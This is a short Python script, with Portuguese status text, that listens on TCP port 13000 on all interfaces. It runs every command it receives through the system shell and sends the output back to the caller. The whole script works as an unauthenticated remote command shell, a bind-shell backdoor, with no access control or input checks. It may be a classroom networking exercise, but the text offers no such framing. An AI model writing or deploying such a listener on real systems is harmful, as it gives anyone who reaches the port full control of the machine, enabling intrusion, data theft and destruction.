#coding:utf-8
from socket import *
import subprocess

serverPort = 13000

serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(('',serverPort))
serverSocket.listen(1)



print('O servidor Está Conectado!')

while (True):
	connection_socket, addr = serverSocket.accept() 
	recebeComando = connection_socket.recv(2048).decode('utf-8')
	saida = subprocess.getstatusoutput(recebeComando)
	
	connection_socket.send(str(saida[1]).encode())
	connection_socket.close()
